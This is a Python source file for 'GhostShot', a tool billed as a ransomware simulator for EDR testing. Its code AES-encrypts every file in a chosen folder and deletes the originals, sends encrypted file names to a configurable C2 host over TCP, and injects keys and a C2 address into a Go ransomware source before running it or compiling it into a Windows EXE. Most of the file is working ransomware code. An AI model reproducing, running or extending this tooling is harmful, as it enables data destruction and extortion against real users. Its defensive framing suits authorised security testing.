# ----- License -------------------------------------------------- # 

#  GhostShot - GhostShot simulates ransomware attacks to test EDR systems, enabling users to strengthen their defense strategies.
#  Copyright (c) 2025 - ThrillByte (Operated by Kaung10). All rights reserved.

#  This software is an proprietary intellectual property developed for
#  penetration testing, threat modeling, and security research. It   
#  is licensed under the ThrillByte OWNERSHIP EDICT:
#
#  🚫 PROHIBITION WARNING 🚫
#  Redistribution, re-uploading, and unauthorized modification are strictly forbidden 
#  under the TOE. Use is granted ONLY under the limited terms defined in the official 
#  LICENSE file (TOE), which must be included in all copies.

#  DISCLAIMER:
#  This tool is intended for **educational or ethical testing** purposes only.
#  Unauthorized or malicious use of this software against systems without 
#  proper authorization is strictly prohibited and may violate laws and regulations.
#  The author assumes no liability for misuse or damage caused by this tool.

#  🔗 LICENSE: ThrillByte OWNERSHIP EDICT (TOE)
#  🔗 Repository: https://github.com/Kaung10
#  🔗 Author: Steven Pereira (@Kaung10)

# ----- Libraries ------------------------------------------------ #

import os
import re
import socket
import hashlib
import subprocess
from rich.console import Console
from rich.panel import Panel
from datetime import datetime, timezone
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import binascii


# ----- Global Declaration --------------------------------------- #

console = Console()
RANSOM_FILE = "ransomware.go"
RANSOM_SRC_DIR = "ransomware"
MARKING = ".hacked"
ransomSetting = "ransomSetting.txt"
key_note = "pass&path.txt"
output_folder = "GhostShot_Output"

# ----- Key Function --------------------------------------------- #

def derive_key(password):
	return hashlib.sha256(password.encode()).digest()

# ----- save information -------------------------------------------- #

import os

def save_configuration(path: str, password: str):
    """
    Create an output folder and append a configuration note with path and password.
    
    Parameters:
        path (str): The target folder path used for encryption/decryption.
        password (str): The password used for encryption/decryption.
        output_folder (str): The folder where the configuration note will be stored.
    """

    # Ensure output folder exists
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Prepare configuration entry
    config_entry = f"""
    ┌───────────────────────────────────────────────┐
    │           GhostShot Configuration Entry       │
    └───────────────────────────────────────────────┘

    ➤ Target Path   : {path}
    ➤ Password      : {password}
    ────────────────────────────────────────────────
    """

    # Append entry to file (instead of overwriting)
    note_path = os.path.join(output_folder, key_note)
    with open(note_path, "a") as f:
        f.write(config_entry)



# ----- C2 Simulation -------------------------------------------- #

def c2_simulation(target_folder="."):
    c2_host = console.input("[bold cyan]Enter C2 Server IP (default 127.0.0.1): [/bold cyan]").strip() or "127.0.0.1"
    
    try:
        port_raw = console.input("[bold cyan]Enter C2 Server Port (default 2701): [/bold cyan]").strip()
        c2_port = int(port_raw) if port_raw else 2701
    except ValueError:
        console.print("[red][!] Invalid port. Defaulting to 2701.")
        c2_port = 2701

    try:
        target_folder = console.input(rf"[cyan][?] Enter folder path to send (default Important_Data): ").strip() or "Important_Data"
        if not os.path.exists(target_folder):
            console.print(f"[red][!] Folder '{target_folder}' not found.")
            return
        hacked_files = [f for f in os.listdir(target_folder) if f.endswith(MARKING)]

        if not hacked_files:
            console.print("[yellow][!] No '.hacked' files found to report.")
            input("Press Enter to continue...")
            return

        for filename in hacked_files:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((c2_host, c2_port))
                
                # Take the first 64 chars of the filename and add newline
                sample = filename.encode()[:64]
                s.sendall(sample + b"\n")
                
                console.print(f"[#C6ECE3][>] Reported:[/#C6ECE3] [bold]{filename}[/bold]")

        console.print("[blue][*] C2 filename exfiltration completed.")
        input("Press Enter to continue...")

    except Exception as e:
        console.print(f"[red][!] Failed to connect to the C2 Server: {e}")

# ----- Encrypt Function ----------------------------------------- #

def encrypt(data, key):
	iv = os.urandom(16)
	cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
	encryptor = cipher.encryptor()
	return iv + encryptor.update(data) + encryptor.finalize()
	
def encrypt_data():
    console.print(rf"[bold bright_magenta]╔══════════════════════════════════════════════════════════════╗")
    console.print(rf"[bold bright_magenta]║        🔒 GhostShot Encryption Mode Activated 🔒             ║")
    console.print(rf"[bold bright_magenta]╚══════════════════════════════════════════════════════════════╝")

    path = console.input(rf"[cyan][?] Enter folder path to encrypt (default Important_Data): ").strip() or "Important_Data"
    user_password = console.input(rf"[cyan][?] Enter encryption password: ").strip()
    key = derive_key(user_password)
    save_configuration(path, user_password)


    for filename in os.listdir(path):
        full_path = os.path.join(path, filename)
        with open(full_path, 'rb') as f:
            data = f.read()
        encrypted = encrypt(data, key)
        with open(full_path + MARKING, 'wb') as f:
            f.write(encrypted)
        os.remove(full_path)

    console.print(rf"[bold green][✔] All files in '{path}' encrypted successfully!")
    print()
    console.print(rf"⚡ Your password & path are stored '{key_note}' ⚡")
    console.print(rf"[bright_magenta]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    input("Press Enter to continue...")



# ----- Decrypt Function ----------------------------------------- #

def decrypt(data, key):
	iv = data[:16]
	cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
	decryptor = cipher.decryptor()
	return decryptor.update(data[16:]) + decryptor.finalize() 

def decrypt_data():
    console.print(rf"[bold bright_yellow]╔══════════════════════════════════════════════════════════════╗")
    console.print(rf"[bold bright_yellow]║        🔓 GhostShot Decryption Mode Activated 🔓             ║")
    console.print(rf"[bold bright_yellow]╚══════════════════════════════════════════════════════════════╝")

    path = console.input(rf"[cyan][?] Enter folder path to decrypt (default Important_Data): ").strip() or "Important_Data"
    user_password = console.input(rf"[cyan][?] Enter decryption password: ").strip()
    key = derive_key(user_password)

    failed_count = 0
    total_files = 0
    for filename in os.listdir(path):
        if not filename.endswith(MARKING):
            continue
        total_files += 1
        full_path = os.path.join(path, filename)
        try:
            with open(full_path, 'rb') as f:
                data = f.read()
            decrypted = decrypt(data, key)
            original_name = full_path.replace(MARKING, "")
            with open(original_name, 'wb') as f:
                f.write(decrypted)
            os.remove(full_path)
        except Exception:
            failed_count += 1

    if failed_count == total_files:
        console.print("[bold red][✘] All files failed to decrypt.")
    elif failed_count > 0:
        console.print(f"[bold yellow][!] Some files couldn't be decrypted.")
    else:
        console.print("[bold green][✔] Files decrypted successfully!")
    console.print(rf"[bright_yellow]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    input("Press Enter to continue...")

# --------- Updating Ransomware.go -----------------

def update_go_config(file_path, updates):
    """
    Updates specific constants/variables in a Go source file.
    """
    if not os.path.exists(file_path):
        print(f"Error: File {file_path} not found.")
        return

    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()

    for key, value in updates.items():
        # This targets the specific key and replaces the value between quotes
        pattern = rf'({key}\s*=\s*)"[^"]*"'
        replacement = rf'\1"{value}"'
        content = re.sub(pattern, replacement, content)

    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(content)
    
    print(f"Successfully updated configuration in {file_path}")


# ------ Generate RSA Key -----------------------------------
def rsaKey():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    # Export DER (binary) format for private key (PKCS#1)
    priv_der = private_key.private_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PrivateFormat.TraditionalOpenSSL,  # PKCS#1
        encryption_algorithm=serialization.NoEncryption()
    )

    # Export DER (binary) format for public key (PKIX)
    pub_der = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo  # PKIX
    )

    # Convert to hex strings
    priv_hex = binascii.hexlify(priv_der).decode()
    pub_hex = binascii.hexlify(pub_der).decode()
    return pub_hex, priv_hex

#------------ Generate Ransomware -------------------------------
def generate_ransom():
    console.print(rf"""[bold bright_magenta]
        ╔══════════════════════════════════════════════════════════════╗
        ║          ◢◤ G H O S T S H O T   M A I N F R A M E ◢◤         ║
        ╚══════════════════════════════════════════════════════════════╝[/]""")
    console.print(Panel.fit("[bold bright_magenta]⚡ INITIALIZING GHOSTSHOT GENERATOR ⚡[/]", style="cyan"))


    # --- Operator Choices ---
    console.print("\n[bold reverse list] CHOOSE YOUR EXECUTION PROTOCOL [/]")
    console.print(rf"  [1] [bold bright_magenta]Run File Generator [/] (Generate Files under {RANSOM_SRC_DIR} folder)")
    console.print("  [2] [bold green]Go Run ransomware[/] (Direct Execution)")
    console.print("  [3] [bold yellow]Cross-Compile[/] (Windows .EXE PE)")
    choice = console.input("\n[bold cyan]ghost@operator > [/]").strip()

    if choice == "1":
        cmd = ["go","run","file-generator.go"]
        subprocess.run(cmd, cwd="Fake_File_Generator", check=False)
        return

    
    # User Input with Cyberpunk styling
    flag_dir = console.input("[bold cyan][?] Target Directory > [/]").strip()
    server_addr = console.input("[bold cyan][?] C2 Uplink Address (IP:PORT) (default 127.0.0.1:2701)> [/]").strip() or "127.0.0.1:2701"
    
    pub_hex, priv_hex = rsaKey()
    
    new_configs = {
        "FlagDir": flag_dir,
        "pubHex": pub_hex,
        "ServerAddr": server_addr
    }

    console.print("\n[bold green][+] Syncing neural configs into Go source...[/]")
    update_go_config(os.path.join(RANSOM_SRC_DIR, RANSOM_FILE), new_configs)

    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Logging the breach parameters
    note_path = os.path.join(output_folder, ransomSetting)
    with open(note_path, "a", encoding="utf-8") as f:
        f.write(
            f"\n[{datetime.now(timezone.utc).isoformat()} UTC] - SESSION LOG\n"
            f"Target   : {flag_dir}\n"
            f"Uplink   : {server_addr}\n"
            f"PubKey   : {pub_hex}\n"
            f"PrivKey  : {priv_hex}\n"
            f"{'—'*50}\n"
        )

    console.print(f"[bold Dim][!] Credentials cached in {ransomSetting}[/]")

    if choice == "2":
        cmd = ["go", "run","."]
        console.print(f"\n[bold green][⚡] Executing: {' '.join(cmd)}[/]")
        subprocess.run(cmd, cwd=RANSOM_SRC_DIR, check=False)

    elif choice == "3":
        # The cross-compiler command
        cmd = [
            "fyne-cross", "windows",
            "-arch", "amd64",
            "-name", "GhostShot",
            "-app-id", "com.ghostshot.app",
            "--icon", "GhostShot.png"
        ]
        console.print(f"\n[bold magenta][⚙] Compiling Payload: {' '.join(cmd)}[/]")
        # Running from the source directory
        subprocess.run(cmd, cwd=RANSOM_SRC_DIR, check=False)
        input("Press Enter to continue...")

    else:
        console.print("[bold red][x] Invalid choice. Connection severed...[/]\n")



# ----- Menu Function -------------------------------------------- #

def menu():
    print("")
    console.print(rf"[bold bright_magenta]╔══════════════════════════════════════════════════════════════╗")
    console.print(rf"[bold bright_magenta]║                ⚡ GhostShot Control Panel ⚡                 ║")
    console.print(rf"[bold bright_magenta]╚══════════════════════════════════════════════════════════════╝")
    print("")
    console.print(rf"[bold cyan][+] Choose your GhostShot Mode:")
    console.print(rf"[bright_yellow]   ➤ 1. 🔒 Encryption Mode")
    console.print(rf"[bright_green]    ➤ 2. 🔓 Decryption Mode")
    console.print(rf"[bright_blue]     ➤ 3. 🌐 C2 Simulation")
    console.print(rf"[magenta]      ➤ 4. 🧪 Generate Sample Ransomware")
    console.print(rf"[bright_red]       ➤ 5. ❌ Exit")

    choice = console.input(rf"[bold cyan][?] Select Mode: ").strip()
    print('\n')

    if choice not in ["1", "2", "3", "4", "5"]:
        console.print("[bold red][✘] Invalid mode selected. Please try again.")
        return

    if choice == "1":
        encrypt_data()
    elif choice == "2":
        decrypt_data()
    elif choice == "3":
        c2_simulation()
    elif choice == "4":
        os.system("cls" if os.name == "nt" else "clear")
        generate_ransom()
    else:
        console.print(rf"[bold red][-] Exiting GhostShot... Stay vigilant ☠")
        exit(0)



# ----- Banner --------------------------------------------------- #

def ascii():
	console.print(rf"""[bold bright_cyan]
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                        │
│       ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗ ███████╗██╗  ██╗ ██████╗ ████████╗    │
│      ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝ ██╔════╝██║  ██║██╔═══██╗╚══██╔══╝    │
│      ██║  ███╗███████║██║   ██║███████╗   ██║    ███████╗███████║██║   ██║   ██║       │
│      ██║   ██║██╔══██║██║   ██║╚════██║   ██║    ╚════██║██╔══██║██║   ██║   ██║       │
│      ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║    ███████║██║  ██║╚██████╔╝   ██║       │
│       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝       │
│                                                                                        │
│                              ☠  G H O S T   S H O T  ☠                                 │
│                                                                                        │
│                           "one shot. no trace. no mercy."                              │
│                                                                                        │
└────────────────────────────────────────────────────────────────────────────────────────┘
	""")
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")
	console.print(rf"[#C6ECE3]  GhostShot - Learn by doing. Simulated Attacks. Measured Impact.") # ,When It Hits Quiet, You Learn Fast.
	console.print(rf"[#C6ECE3]  Created by [ThrillByte]Kaung10")
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")

# ----- Main Function -------------------------------------------- #

if __name__ == "__main__":
    while(True):
    	os.system("cls" if os.name == "nt" else "clear")
    	#key = derive_key(password)
    	ascii()
    	menu()

# ----- End ------------------------------------------------------ #
